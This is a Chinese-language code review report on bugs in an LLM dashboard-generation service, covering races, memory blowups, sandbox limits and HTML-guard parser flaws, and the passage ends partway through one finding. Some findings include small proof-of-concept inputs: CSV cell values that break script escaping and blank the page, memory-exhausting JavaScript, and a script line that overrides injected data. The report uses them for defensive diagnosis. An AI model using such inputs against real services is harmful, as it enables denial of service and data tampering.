# deepagent-service 全面 review — findings

**日期**：2026-08-02
**範圍**：`deepagent-service/` 全部程式碼 + 與 Java `LangGraphAnalysisProvider` 的 wire 契約
**基準 commit**：`bd573b2`（PR #9 workspace 重整 merge 之後）
**結論**：36 條 findings，無一條被既有程式碼、PR #6 或 PR #9 修掉。

> 文中所有 `file:line` 皆對應基準 commit。`app/main.py` 的行號在 PR #9
> （移除 `WorkspaceStore` 抽象）之後位移過，本文件已逐條重新核對。
> 若日後 master 再前進，行號可能再漂——以引用的**程式碼內容**為準，行號只是導引。

---

## 驗證狀態標記

每條 finding 標註證據強度，**不要把推論當成已證實的事實**：

| 標記 | 意義 |
|---|---|
| ✔︎ | 在本機實跑重現過（指令與輸出記在該條目內） |
| ▲ | review agent 附實測數據或可執行 repro script |
| ○ | 靜態閱讀推論，**尚未實測** |

---

## 索引

### 一、資料正確性（使用者看到錯的數字，無任何訊號）

| ID | 標題 | 證據 |
|---|---|---|
| [S0-1](#s0-1) | 同 session 併發 `/chat` → sql 與 json 錯配 | ▲ |
| [H1](#h1) | 模型自寫一行覆蓋注入的真值 | ▲ |
| [C2](#c2) | sandbox 檢查的資料集 ≠ production 注入的資料集 | ✔︎ |
| [#1](#c-1) | AI 對話歷史全部降級成使用者訊息 | ✔︎ |

### 二、可用性（崩潰、卡死、永久壞掉）

| ID | 標題 | 證據 |
|---|---|---|
| [S0-1b](#s0-1b) | 損毀的 `results/*.json` 讓 session 永久 brick | ✔︎ |
| [S0-2](#s0-2) | `InMemorySaver` 無淘汰 → 可預期 OOM | ▲ |
| [C4](#c4) | sandbox 無 memory limit（實測 4GB RSS） | ▲ |
| [C4b](#c4b) | sandbox replay 無全域時間上限（實測 57s） | ▲ |
| [H4](#h4) | 使用者上傳的 CSV 內容能吃掉整個 `<body>` | ✔︎ |
| [C1](#c1) | guard 自己把合法 HTML 改壞，然後蓋章通過 | ✔︎ |
| [C3](#c3) | regex 含引號 → 後面所有 `<script>` 從此不存在 | ▲ |
| [S1-1](#s1-1) | 2GB CSV ingest 在 event loop 上 → pod 重啟 | ○ |
| [#2](#c-2) | xlsx 送得進、吃不掉 | ✔︎ |
| [F1](#f1) | client 斷線後 orphan agent run | ✔︎ |
| [N1](#n1) | single-write 的真實天花板比 guard 上限低 20 倍 | ✔︎ (量測) / ○ (截斷行為) |

### 三、體驗與效能

| ID | 標題 | 證據 |
|---|---|---|
| [F2](#f2) | retry 共用 `EventBridge` → 殭屍 STEP 永遠轉圈 | ✔︎ |
| [#3](#c-3) | 心跳有洞 + `: ping` 不重置 Java timeout | ▲ |
| [S0-3](#s0-3) | 每次 model call 讀 30MB 只為產出 4KB | ▲ |
| [S1-2](#s1-2) | rmtree 讓 skill gate 靜默失效 85% | ▲ |
| [F4](#f4) | guard 阻塞 event loop，一輪最多 6 次 | ○ |
| [F5](#f5) | `/repair` 對逾期 session 必定 422 | ○ |
| [S1-3](#s1-3) | checkpointer 同 thread_id lost update | ○ |
| [M1](#m1) | ReferenceError stub 遮蔽後續偵測 | ▲ |
| [M3](#m3) | 錯誤數只有 getCol miss 有上限 | ▲ |
| [N2](#n2) | `_guard_repair_should_stop` 的前提被 PR #6 推翻 | ○ |
| [N3](#n3) | single-write 讓 S0-2 的 context 放大再上一檔 | ○ |

### 四、正確但脆弱（設計債）

| ID | 標題 | 證據 |
|---|---|---|
| [S2-3](#s2-3) | 同步 graph 路徑靜默繞過兩個 middleware | ○ |
| [S2-2](#s2-2) | `_unread_required_paths` 兩種 fail 方向相反 | ○ |
| [S2-1](#s2-1) | `ToolResultRecorder` FIFO fallback 竊取記錄 | ▲ |
| [S2-4](#s2-4) | `has_checkpoint` 全量反序列化 + 副作用 | ✔︎ |
| [F3](#f3) | 收尾區段零例外保護，違反自訂契約 | ○ |
| [N4](#n4) | `unlink()` → `write()` 成為每次變更的必經路徑 | ○ |
| [H2](#h2) | jsdelivr path traversal + rewriter 契約落差 | ▲ |
| [H3](#h3) | 跨 block stack frame 捏造行號 | ▲ |
| [M2](#m2) | `</head>` 在註解裡 → 注入進註解 | ▲ |
| [M4](#m4) | 引數區註解含撇號 → 靜默不套主題 | ▲ |
| [F6](#f6) | 截斷回應的 fence fallback 出貨 | ○ |
| [S3](#s3) | auth：token 回寫較舊值、client 永不關閉 | ○ |
| [N5](#n5) | 三處 stale `edit_file` 引用 | ✔︎ |
| [N6](#n6) | `notes.md` 全量重寫無「保留既有內容」警告 | ○ |
| [L1–L4](#l1l4) | html_guard 四條 LOW | ▲ |

---

# 一、資料正確性

這一類最危險：**系統回報成功、畫面看起來正常、數字是錯的**。沒有任何訊號提示使用者。

<a id="s0-1"></a>
## S0-1 ▲ 同 session 併發 `/chat` → sql 與 json 錯配

**機制**
`app/agent/tools/data.py:93` 的 `connection_lock` 建在 `build_data_tools` 的 closure 裡 ＝ per-request。
同一個 `(userId, sessionId)` 的兩個 `/chat` 拿到的是**兩把不同的鎖，指向同一個 workspace 目錄**。
`next_query_id`（`app/engine/results.py:36`，glob 計數）與 `record_query` 的兩段 write 完全沒有跨 request 保護。

**證據**（30 次 barrier 同步試驗，兩個獨立 recorder/lock 打同一份 workspace）

```
整筆查詢遺失（兩邊都拿到 q1，只剩一個檔）   25 次
sql 與 json 錯配（q1.sql 是 A 的、q1.json 是 B 的）  4 次
results/*.json 損毀無法解析                  2 次
```

**影響**
最痛的是「錯配」那 4/30：模型收到 `tableId: q1`、以為綁的是自己那條查詢，
但 `__ERD_RESULTS__["q1"]` 裡是另一個請求的資料——而 TABLE 事件顯示的又是正確那份。
**使用者看到表格對、圖表錯。**

諷刺的是 `WiringManifestMiddleware` 存在的唯一理由就是防止 qN 綁錯，
在這條路徑上它反而成為錯誤的權威來源。

**觸發條件不需要使用者亂點**——見 [F1](#f1)，orphan agent run 會自己製造同 session 併發。

**修法**
1. `next_query_id` + `record_query` 在 **workspace 層級**互斥（session dir 內的 lock file / `fcntl.flock`），不是 closure lock
2. `record_query` 改 write-temp + `os.replace` 原子落檔
3. 根本解：per-sessionId 的 in-process lock 讓同 session 的 `/chat` 序列化（或直接回 409）

**測試缺口**
`tests/test_data_tools.py:166` 的 `test_run_sql_concurrent_calls_do_not_collide_on_query_id`
只覆蓋**同一把鎖內**的競爭，跨 request 的形狀完全沒 pin。

---

<a id="h1"></a>
## H1 ▲ 模型自寫一行覆蓋注入的真值

**機制**
`app/engine/results.py:126-129` 的 `inject_results` 把真資料插在 `</head>` **之前**。
模型若在 `<body>` 裡自己寫一份 `window.__ERD_RESULTS__ = {...}`，DOM 順序在後 → **後者贏**。

**證據**

```html
<script>window.__ERD_RESULTS__ = {"q1":{"columns":["dept","n"],"rows":[["FAKE",999]],...}};</script>
```

```
guard ok: True
真值 index 180 / 假值 index 1095  → 瀏覽器看到 FAKE
_check_data_binding 判定「有讀 __ERD_RESULTS__」 ✓
```

帶 `id="erd-results-data"` 的版本效果相同——`strip_injected_blocks` 只在下一輪
continue-edit 才剝，**出貨這輪不剝**。

**影響**
這正是 `_check_data_binding` 這條規則設計要擋的「數字是硬寫的」情境，一行就繞過。

**修法**
新增確定性規則，與 `_check_no_register_theme`（`html_guard.py:1266`）完全同構：
inline script 內出現對 `__ERD_RESULTS__` 的**賦值**（`__ERD_RESULTS__\s*=`）或
`id="erd-results-data"` 一律退件，訊息寫「資料由系統注入，HTML 只能讀不能寫」。

---

<a id="c2"></a>
## C2 ✔︎ sandbox 檢查的資料集 ≠ production 注入的資料集

**機制**
兩邊灌的東西根本不同：

| 位置 | 灌什麼 |
|---|---|
| `app/main.py:321` | `check_dashboard_html(html, set(results), results)` — sandbox 灌**全部** query id |
| `app/main.py:378-380` | `{qid: results[qid] for qid in referenced_query_ids(report.html)}` — 只注入比對到的**子集** |

而 `_REFERENCED_QUERY_ID_PATTERN`（`app/engine/results.py:18`）只認字面值。

**證據**（本機實跑）

```
__ERD_RESULTS__["q1"]    → {'q1'}
__ERD_RESULTS__.q2       → set() ← 空
__ERD_RESULTS__[ids[0]]  → set() ← 空
```

兩種靜默出貨情境：

```js
// E1：dot access — guard ok=True，注入 payload 不含 q2
const r2 = window.__ERD_RESULTS__.q2;
// 瀏覽器：undefined → r2.rows TypeError → 圖死

// E2：動態 key + 防禦性 fallback — guard ok=True
const r = window.__ERD_RESULTS__[ids[1]] || {columns:[],rows:[]};
// 實際注入：window.__ERD_RESULTS__ = {};   ← 空 payload，整頁零資料
```

`_check_data_binding`（`html_guard.py:1016`）看到 `__ERD_RESULTS__` 字樣就放行，形同虛設。

**修法（一行，投報比最高）**
`_execute_scripts_smoke` 的 seed key 從 `available_query_ids` 改成 `referenced_query_ids(html)`
——讓 sandbox 灌「production 真的會注入的那一份」。
E1、E2 立刻各自變成一條有行號的 TypeError，不需要新規則。
（`available_query_ids` 仍留給 `_check_referenced_query_ids` 用。）

---

<a id="c-1"></a>
## #1 ✔︎ AI 對話歷史全部降級成使用者訊息

**機制**

Java（`backend/.../agent/provider/analysis/LangGraphAnalysisProvider.java:180-191`）：

```java
/**
 * ...agent-service's /chat endpoint expects the OpenAI-style role vocabulary
 * (user/assistant). The mapping is exhaustive (throws on an unrecognized sender)
 * rather than defaulting to "user", to avoid silently misrepresenting conversation history.
 */
if ("AI".equals(message.sender())) { role = "assistant"; }
```

Python（`app/main.py:171`）：

```python
AIMessage(item.text) if item.role == "AI" else HumanMessage(item.text)
```

Java 送的永遠是 `"assistant"`，Python 比對的是 `"AI"` → **每一則 AI 歷史回覆都被重建成 `HumanMessage`**。

**證據**：兩側 grep 確認（見上方引用行號）。

**影響面比看起來大**
這條路徑只在 `session_state.has_checkpoint()` 為 False 時走，而 checkpointer 是
process-lifetime 的 `InMemorySaver`（`app/agent/session_state.py:12`）。
命中條件 ＝ **服務重啟後的第一輪、以及任何在新 pod 上續談的 session**——
不是 edge case，是 k8s 環境的預設行為。
使用者續談時，模型看到的是一連串「使用者說了 N 次話」，自己一句都沒說過。

那段 Javadoc 特地寫成 exhaustive、寧可 throw 也不 default，理由白紙黑字是
「to avoid silently misrepresenting conversation history」——結果 Python 這一端全部 misrepresent 了。

**修法**：一行。`item.role == "assistant"`（或同時容忍兩種寫法）。

---

# 二、可用性

<a id="s0-1b"></a>
## S0-1b ✔︎ 損毀的 `results/*.json` 讓 session 永久 brick

**機制**
`app/engine/results.py:100-106` 的 `load_all_results` 零錯誤處理：

```python
def load_all_results(workspace: SessionWorkspace) -> dict[str, dict]:
    results: dict[str, dict] = {}
    for result_path in workspace.results_dir.glob("*.json"):
        query_id = result_path.stem
        results[query_id] = json.loads(result_path.read_text(encoding="utf-8"))
    return results
```

四個呼叫點（`app/agent/middleware.py:52`、`app/main.py:320`、`:342`、`:490`）也都沒包 try/except。

**證據**：本機 `inspect.getsource` 確認 `'try' in src == False`。

**影響**
[S0-1](#s0-1) 造成的損毀檔留在磁碟 → 之後**每一輪**的第一次 model call
都在 `WiringManifestMiddleware` 內拋 → `pump_agent_events` 轉成 ERROR →
`app/main.py:231` 把 `str(error)` 原封不動送給使用者。
該 session 之後永遠只回 `Extra data: line 1 column 94`，`/repair` 也一起死。
**無自癒路徑。**

**修法**：單檔 `JSONDecodeError` 降級跳過並記 warning，不炸掉整輪。這是 S0-1 的止血。

---

<a id="s0-2"></a>
## S0-2 ▲ `InMemorySaver` 無淘汰 → 可預期 OOM

**機制**
`app/agent/session_state.py:12` 是 module-level `InMemorySaver`。
`langgraph/checkpoint/memory/__init__.py:427` 的 `put`：每個 superstep 對 `new_versions`
裡的每個 channel 寫一份 `self.blobs[(thread, ns, channel, version)] = serde.dumps_typed(...)`。
`messages` channel 每個 superstep 都換版本 → **每個 superstep 存一份完整訊息串列的序列化副本**。
`blobs` / `storage` / `writes` 三個 dict 全程無淘汰、無 TTL、無 size cap。

**證據**（模擬一輪 dashboard 任務：48KB skill + 10 次 run_sql + 50KB write_file + 3 輪 edit ＝ 34 superstep）

```
最終訊息串列序列化後 =  320 KB
該輪永久保留的 blobs = 4.8 MB    （放大 15.5x）
```

推算：20 使用者 × 每天 10 輪 ≈ **1 GB/天**。
guard 修復迴圈（最多 5 輪，每輪把整份 dashboard 再寫進歷史）會再乘上去。
2–4GB 容器一到兩天 OOM。**PR #6 之後這個數字要再往上修，見 [N3](#n3)。**

**與 docstring 的差別要講清楚**
模組 docstring 寫「重啟丟失是可接受的 v1 降級」——那句話的前提是重啟由外部原因造成。
這個設計**會主動導致重啟**，而且是無預警、無 drain 地把所有 session 記憶一次抹掉。
LangGraph 官方對 `InMemorySaver` 的說明是 "Only use for debugging or testing"。

deepagents 的 `create_summarization_middleware` 幫不上忙——它明確標榜
"Non-mutating message state... leaving `state["messages"]` intact"，
所以每一份完整 HTML 都原封不動留在 checkpoint 裡。

**修法**：LRU 包裝（依 thread 數 + thread 內 checkpoint 數雙重淘汰），或換 SQLite/Postgres saver。

---

<a id="c4"></a>
## C4 ▲ sandbox 無 memory limit

**機制**
`html_guard.py:605-606` 的 `_build_sandbox_context` 只呼叫 `set_time_limit`，
**沒呼叫 `set_memory_limit`**（該 API 存在：`quickjs.Context.set_memory_limit`）。

**證據**

| script | 耗時 | peak RSS |
|---|---|---|
| `let s='x'; for(let i=0;i<40;i++){ s=s+s; }` | 0.33s | **1086 MB** |
| `const a=[]; for(;;){ a.push(new Array(100000).fill(7)); }` | 8.39s | **4025 MB** |

第二例同時證明 `_SANDBOX_TIME_LIMIT_SECONDS = 2.0` 對配置密集的迴圈幾乎不設防（實跑 8.4s）。

**影響**
容器有 memory limit 時這是整個 deepagent-service process 被 OOM kill——
不只這個 session，**所有並行 session 一起死**。

**修法**：`set_memory_limit(~64MB)` + `set_max_stack_size`。

---

<a id="c4b"></a>
## C4b ▲ sandbox replay 讓時間預算失控

**機制**
`html_guard.py:936-994` 的 retry loop 每發現一個新 ReferenceError 就重建 context，
並**重放此 block 之前的所有 block**（`:972-980`），每次 eval 各自重新拿 2s 預算，
沒有全域上限。`_MAX_REFERENCE_ERROR_RETRIES_PER_BLOCK = 8`。

**證據**

| HTML | 耗時 |
|---|---|
| 1 個 ~1.1s 的 block（單獨） | 1.15s |
| 同一個 block + 後面一個含 8 個未宣告變數的 block | **10.39s** |
| 3 個 `while(true){}` + 一個 8-變數 block | **56.93s** |

成本 ≈ `Σ(block 耗時) × 8 × block 數`。

**影響**
這段是同步 CPU 呼叫，寫在 `app/main.py:321` 的 `async` generator 裡 →
直接卡住 FastAPI event loop，**所有其他使用者的 SSE 一起停 57 秒**；
再乘上 `GUARD_REPAIR_MAX_RUNS = 5`。與 [#3](#c-3) 疊加會造成別人的 Java 180s timeout 誤判。

**修法**：全域 deadline（例如 10s，逾時記 warning 降級，符合既有「驗證器掛掉不擋主流程」哲學）
+ 整段 guard 丟 `anyio.to_thread.run_sync`。

---

<a id="h4"></a>
## H4 ✔︎ 使用者上傳的 CSV 內容能吃掉整個 `<body>`

**機制**
`app/engine/results.py:118` 的 `build_results_script` 只做 `.replace("</", "<\\/")`。
HTML5 tokenizer 的 script data 狀態機裡，`<!--` 進入 escaped 態，
其後遇到 `<script`（**沒有 `/`，所以逃過 escape**）進入 double-escaped 態，
此時 `</script>` 不再終止元素。

**證據**（本機實跑）

```
escape 後仍含裸露 <!--    : True
escape 後仍含裸露 <script : True
```

用真的 HTML5 parser（parse5）驗證：

```
cells = ["normal"]                 → elements: html head body div#keep script div#after
cells = ["<!-- x", "<script foo"]  → elements: html head body div#keep script      ← div#after 消失
```

**影響**
因為 `inject_results` 插在 `</head>` 之前，實務後果是**整個 `<body>` 消失 → 空白頁**。
觸發來源是**使用者上傳的 CSV cell 內容**（完全使用者可控），
且發生在 guard **之後**（注入是檢查完才做），**guard 物理上不可能看到**。

**修法**：`serialized.replace("<", "\\u003c")`。
JSON 字串裡的 `<` 仍解回 `<`，一次解決 `</script>`、`<!--`、`<script` 三種。

---

<a id="c1"></a>
## C1 ✔︎ guard 自己把合法 HTML 改壞，然後蓋章通過

**機制**
`html_guard.py:1356-1399` 的 `_apply_erd_theme` 在**未遮罩的原文**上掃 `echarts.init(`，
且 `check_dashboard_html:1449` 把它排在所有檢查**之後**，輸出的 `report.html` 從未重新驗證。

這是全檔**唯一會改寫原文的規則，也是唯一沒有字串/註解感知的掃描器**
——其他掃描器都走 `_mask_strings_and_comments`。

**證據**（本機實跑）

```
輸入： const hint = 'call echarts.init(el) to create a chart';
改寫後：const hint = 'call echarts.init(el, 'erd') to create a chart';
把 report.html 再檢一次 → script#0 line 3 JS syntax error: SyntaxError: expecting ';'
```

> 註：本機最小重現因缺 tooltip / 缺 `__ERD_RESULTS__` 讀取而被其他規則判成 `ok=False`；
> 「guard 把合法 JS 改成語法錯誤」的機制已證實，`ok=True` 的完整版需要一份滿足其餘規則的
> 真實 dashboard（真實 dashboard 依建構必然滿足）。

**影響**
`app/main.py:381` 送出的正是 `inject_theme(inject_results(report.html, ...))`。
因為 `report.ok` 已經是 True，`GUARD_REPAIR_MAX_RUNS` 迴圈**永遠看不到**這個錯誤。

順帶：`<p>使用 echarts.init(el) 建立圖表</p>` 這種可見文案也會被改寫。

**修法**
`_apply_erd_theme` 先算 `_mask_strings_and_comments(html)`，只在遮罩後仍是程式碼的位置取
`call_start`（index 一對一對應，可直接沿用）；並在回傳前對 `rewritten_html` 重跑一次
`_check_js_syntax`（改寫後 ≠ 改寫前才跑）。

---

<a id="c3"></a>
## C3 ▲ regex literal 含引號 → 後面所有 `<script>` 從此不存在

**機制**
`_find_script_end`（`html_guard.py:108-178`）與 `_mask_strings_and_comments`（`:181-255`）
都沒有 regex literal 狀態。`/` 後面不是 `/` 或 `*` 就只 `index += 1`，
於是 regex 內的引號被當成字串開頭。

**證據**

```js
const clean = name.replace(/'/g, '');    // 完全合法
```

→ `script#0 line 6 JS syntax error: SyntaxError: unexpected token in expression: '<'`
（行號指著 `</script>`）。雙引號版 `/"/g` 同樣中招。

**Blast radius 比誤報大**
1. `_find_script_end` 回 `len(html)`，`_extract_inline_scripts_with_lines:274-275`
   把 `search_from` 推到檔尾 → **後面所有 `<script>` block 從此不存在**。
   實測含 2 個 block 的 HTML 只被看到 1 個，block 1 裡真正的 missing-DOM-id bug 完全隱形。
2. Level 1 有錯 → `check_dashboard_html:1433` gate 掉整個 Level 2。
3. **錯誤訊息無法修**：模型看到「line N 有個 `<`」但那一行是 `</script>`。
   連跑 `GUARD_REPAIR_MAX_RUNS`，`_guard_repair_should_stop` 判定錯誤集合不變 → 立刻停 →
   使用者拿到「dashboard 製作失敗」，**但那份 HTML 在瀏覽器裡完全正常**。

**已驗證沒問題的鄰居**（不必動）：`a / b / c` 除法、`` `x</script>y` `` 在 template literal 內、
`<!--` in script、簡單 `${}` 內插。

巢狀 template（`` `a${ `b${n}c` }d` ``）在 `_mask_strings_and_comments` 會提早收尾，
讓內層 `${n}` 的大括號洩進 `_find_matching_close_brace` 的深度計數——
目前因為括號成對而沒炸，但那是運氣。同一個 fix 一併解掉。

**修法**：把 regex literal + template `${}` 深度加進狀態機。
**backend `JsSyntaxValidator.java` 有同一個洞，是同一份 port，需同步回寫。**

---

<a id="s1-1"></a>
## S1-1 ○ `/chat` 前置作業全在 event loop 上做同步阻塞 I/O

**機制**
`app/main.py:251-256` 在 `async def chat` 裡直接依序呼叫：

| 呼叫 | 成本 |
|---|---|
| `stage_skills` | `shutil.rmtree` + `copytree`，實測本機 SSD 6.1 ms（PVC 上 10–100 倍） |
| `open_locked_connection` | DuckDB `CREATE TABLE AS SELECT * FROM read_csv_auto(...)`，**專案上限單檔 2GB CSV**，ingest 數十秒起跳 |
| `has_checkpoint` | 見 [S2-4](#s2-4) |

**影響**
`open_locked_connection` 最致命：整個 process 在 CSV ingest 期間完全停擺，
連 `/health` 都回不了 → k8s liveness probe 失敗 → pod 重啟 →
**[S0-2](#s0-2) 的所有 in-memory checkpoint 一次全滅**。
GIL 是否釋放無關緊要，event loop 就在這條 thread 上。

**修法**：三者一律 `await asyncio.to_thread(...)`。

---

<a id="c-2"></a>
## #2 ✔︎ xlsx 送得進、吃不掉

**機制**

| 端 | 行為 |
|---|---|
| Java 上傳白名單 | 放行 `csv` 與 `xlsx`（`FileService.java:184-189`，xlsx 還有專屬 size limit） |
| Java `buildRequestBody` | `sources` **完全不過濾**（`LangGraphAnalysisProvider.java:145-153`），xlsx 帶著 `fileType: "xlsx"` 送出 |
| Python | `_READERS = {"csv": ..., "parquet": ...}`（`app/engine/duck.py:8`）→ 直接 `raise ValueError` |

**證據**：兩側 grep 確認；全 `deepagent-service/app/` grep `xlsx|excel` 零筆。
真 uvicorn 實測：

```
STATUS 200  content-type: text/event-stream  transfer-encoding: chunked
READ ERROR IncompleteRead(0 bytes read)
ValueError: unsupported file type: xlsx   ← app/main.py:256 → app/engine/duck.py:47
```

**影響**
`open_locked_connection` 在 `chat()` 的**第一個 yield 之前**就炸，
headers 已送出、body 零 byte，連線直接斷。
Java 端 `bodyToFlux` 收到 premature close → `ErrorEvent("ANALYSIS_STREAM_FAILURE", ...)`。
使用者看得到錯誤，但訊息完全無法對應「這個檔案格式不支援」。

順帶：`parquet` 是反向的死選項——Java 永遠送不出來。

**修法（需決策）**：backend 停收 xlsx / deepagent 加 reader / 最低限度在進 duck 前先驗型別並
`yield` 一個帶明確 code 的 ERROR。

---

<a id="f1"></a>
## F1 ✔︎ client 斷線後 orphan agent run

**機制**
`app/main.py:193` `asyncio.create_task`，`:235-236` 只有 `finally: await producer_task`。
**整個檔案沒有任何 `cancel()`**（本機 grep 確認零筆）。

**證據**（cancel 消費端 task，模擬 starlette 在 client 斷線時 cancel `stream_response`）

```
[t=0.30] client disconnects -> cancelling response task
[t=0.30] duckdb connection.close() called
[t=1.54] agent STILL running after connection.close() (tick 30)
orphan pump ticks after disconnect: 35   done: False
```

**影響**
使用者關分頁 / Java `Flux.timeout` 觸發 → `chat()` 收到 `CancelledError` →
`finally`（`:403-404`）跑完 `connection.close()` → **pump task 完全不受影響繼續跑整輪 graph**。

1. `run_sql_tool` 是 never-raise 契約（`data.py:134-136` 一律回 `SQL_ERROR:`）。
   連線已關閉 → 每次查詢都回錯誤字串 → **模型不會停，一路猜到 `AGENT_RECURSION_LIMIT=80`**，
   燒掉整輪 LLM 費用。
2. 使用者重問時 Java 開新 `/chat`，orphan 仍在對**同一個 thread_id 寫 checkpoint、
   對同一份 workspace 寫 dashboard.html**。新 request 開頭的 `stage_skills` 還會
   `shutil.rmtree` 掉 orphan 正在讀的 `.skills/`。
   **這個併發不是使用者開兩個分頁造成的，是 `main.py` 自己製造出來的** ——
   [S0-1](#s0-1) 的主要觸發源。
3. 即使明確 `aclose()`，`finally: await producer_task` 是「等整輪跑完」而非「取消」
   ——實測 `aclose took 2.04s`（＝ producer 全長），真實情況是分鐘級。

**修法**

```python
finally:
    producer_task.cancel()
    with contextlib.suppress(asyncio.CancelledError):
        await producer_task
```

並在 `chat()` 用 `contextlib.aclosing(_stream_agent_turn(...))` 讓內層 generator 確定性關閉，
而非靠 GC 的 asyncgen finalizer。正常路徑 task 早已完成，`cancel()` 是 no-op，不影響現有測試。

---

<a id="n1"></a>
## N1 ✔︎/○ single-write 的真實天花板比 guard 上限低 20 倍

**背景**：PR #6 之後，dashboard.html 的每一次修改、每一輪 guard 修復都必須**整份重寫**。

**證據**（本機量測 `.local-workspace` 實際產出）

```
62855 bytes ≈ 17958 tokens   ← 最大的一份
50139 bytes ≈ 14325 tokens
47632 bytes ≈ 13609 tokens
```

可用預算 ＝ `AGENT_MAX_TOKENS 32768` − `AGENT_REASONING_MAX_TOKENS 8192` ≈ **24576 tokens**。
最大那份已吃掉 **73%**。

同時 `HTML_MAX_BYTES = 2_000_000`（`html_guard.py:47`）——
**guard 的體積上限是實際可產出量的 20 倍**。
真正會撞到的限制（output budget）沒有任何 guard 規則守著；
有規則守著的那個限制永遠不會被觸發。

**尚未實測的部分 ○**
截斷後的實際行為有兩種可能，後果差很多：

1. tool_call 的 arguments JSON 被 `finish_reason: length` 截斷 → JSON 解析失敗 →
   LangChain 產生 `invalid_tool_calls` 或拋錯（吵但安全）
2. 若某層做了容錯、把部分內容當 arguments 傳下去 → `write_file` 寫進**半截 HTML**，
   而 `_check_structure`（`html_guard.py:92-97`）只檢查「非空且含 `<div`」，
   截斷點若落在最後一個 `</script>` 之後就**全數通過並出貨**

第二種正是 [F6](#f6) 針對 `/repair` 提的洞，只是現在搬到**主路徑**。

**修法**
1. 先實測一次截斷行為（決定嚴重度）
2. 不論結果如何，`_check_structure` 都該加一條「必須含 `</html>`」
   ——原本是 F6 的 nice-to-have，single-write 之後變成必要
3. 考慮把 `HTML_MAX_BYTES` 調到與 output budget 同量級，讓超限以**明確錯誤**而非靜默截斷呈現

---

# 三、體驗與效能

<a id="f2"></a>
## F2 ✔︎ retry 共用 `EventBridge` → 殭屍 STEP 永遠轉圈

**機制**
`app/main.py:178-238`：`bridge` 由呼叫端傳入、跨 `stream_retry_runs` 重試共用
（retry 的 `while True` 在函式**內部**），而 `EventBridge.active_steps`（`app/agent/events.py:99`）
只在 `on_tool_end`/`on_tool_error` 才移除（`:109`）。

**證據**（attempt 1 送出 `on_tool_start(run_sql, r1)` 後連線中斷；attempt 2 從 checkpoint 續跑，該 tool 已完成不再重跑）

```
wire: STEP tool_run_sql_r1  RUNNING
wire: STEP tool_write_file_r2 RUNNING
wire: STEP tool_write_file_r2 SUCCESS
leftover active_steps: [{'stepKey': 'tool_run_sql_r1', 'status': 'RUNNING'}]
heartbeat after the turn: {'stepKey': 'tool_run_sql_r1', 'status': 'RUNNING'}
```

**影響**
`tool_run_sql_r1` 的 RUNNING 已上 wire、永遠收不到終結事件。
更糟的是 `heartbeat_event()` 取 `active_steps[-1]`——其他 step 結束後
**這個殭屍會每 15 秒被重送一次到本輪結束**，前端看到永遠轉圈的「查詢資料」。

附帶兩個後果：
- attempt 1 若在 tool 開跑前已送過 TOKEN，retry 會重送同一段開場文字
  （`bridge.tool_started` 仍為 False），Java 端累加 delta → **重複文字**
- 若中斷時該 tool 尚未 checkpoint，retry 重跑會拿到**新的 run_id 與新的 query id**
  （`next_query_id` 以檔數遞增）→ 同一條查詢落成 q1 與 q2 兩份、wire 上兩張相同的 TABLE

**修法**：retry 前先把 `bridge.active_steps` 逐一以終結狀態（`status: "ERROR"`）補送並清空。

---

<a id="c-3"></a>
## #3 ▲ 心跳有洞 + `: ping` 不重置 Java timeout

兩個獨立事實疊加：

**(a) 心跳在沒有 active step 時完全靜默**
`EventBridge.heartbeat_event()`（`app/agent/events.py:151-156`）在 `active_steps` 為空時回 `None`，
消費端 `if heartbeat is not None`（`app/main.py:205`）就不 yield。
而 `on_tool_end` 會把 step 移除（`events.py:109`），
`_handle_chat_model_stream` 在 `tool_started` 為真後不再發 TOKEN（`events.py:137-139`）。
→ **第一次工具呼叫之後，模型每一次生成期間（包含吐出整份 dashboard 那次，最長的一次）
wire 上零事件、零心跳。**

**(b) FastAPI 的 `: ping` 救不了 Java 的 timeout**
反編譯實際 classpath 上的 `spring-web-6.2.3` 確認：
`ServerSentEventHttpMessageReader.buildEvent` 在目標型別是 `String`
（即 `bodyToFlux(String.class)`，`LangGraphAnalysisProvider.java:108`）時回傳的是 `data`；
comment-only 事件的 `data` 為 null，`lambda$read$0` 隨即 `Mono.empty()`。
**comment 行不產生任何 downstream element，因此不重置 `Flux.timeout` 的計時器。**

**Timeout 對照**

| 項目 | 值 |
|---|---|
| Python 心跳 | 15.0s（`app/main.py:51`） |
| FastAPI 自動 `: ping` | 15.0s |
| Java 逐事件閒置逾時 | **180s**（`LangGraphAnalysisProvider.java:121` + `application.yml:57`） |
| Java 總時長逾時 | **不存在** |

**影響**：一次超過 180 秒的模型生成 ＝ `ANALYSIS_TIMEOUT`。
以 qwen3.6-35b 直寫完整 dashboard 的量級，這個距離並不安全。
[C4b](#c4b)/[S0-3](#s0-3) 的 event loop 阻塞會**連鎖放大**——阻塞期間所有 session 的心跳一起發不出去。

**修法**：`heartbeat_event()` 在 `active_steps` 為空時也發一個常駐 STEP（或 `TOKEN` delta=""）。

**附帶**：`.timeout()` 位置在 `.concatMap(toEventOrEmpty)` **之後**（`:112` vs `:121`），
而 `DASHBOARD_HTML` 與 `QUESTION` 都回 `Flux.empty()` → 這兩種事件**不重置閒置計時器**。
實務上 `DASHBOARD_HTML` 後面緊接 `ANSWER`，沒有真空窗，但這個耦合是隱性的。

---

<a id="s0-3"></a>
## S0-3 ▲ 每次 model call 讀 30MB 只為產出 4KB

**機制**
`app/agent/middleware.py:52` 的 `awrap_model_call` 是 coroutine、跑在 event loop 上，
裡面直接呼叫同步的 `load_all_results`——glob 全部 `results/*.json`、
逐檔 `read_text` + `json.loads`，**包含每筆最多 5000 列的 rows**，
然後 `format_wiring_manifest` 只取 `intent` 與 `columns`，**rows 全部丟掉**。

**證據**（50 筆查詢 × 5000 列 × 8 欄，本機 SSD、warm page cache）

```
磁碟上 = 30.6 MB
單次 load_all_results = 295 ms（event loop 完全阻塞）
產出 manifest = 4179 字元
一輪 ~40 次 model call 累計阻塞 ≈ 11.8 s
```

PVC RWX（NFS）上再放大一個量級。

**修法**：落檔時另寫一份 `results/_index.json`（或 metadata 與 rows 分檔），
middleware 只讀 index；再不濟也要 `await asyncio.to_thread(...)` 並用 mtime 快取。

---

<a id="s1-2"></a>
## S1-2 ▲ rmtree 讓 skill gate 靜默失效 85%

**機制**
`app/engine/workspace.py:104` 每輪開頭無條件 `shutil.rmtree(.skills)` 再 `copytree`。
`DashboardSkillGateMiddleware.__init__`（`app/agent/middleware.py:89-93`）
在 `build_agent` 當下用 `is_file()` **快照** `_required_paths`。

**證據**（背景 thread 持續重 stage，前景做 3000 次 `build_agent`）

```
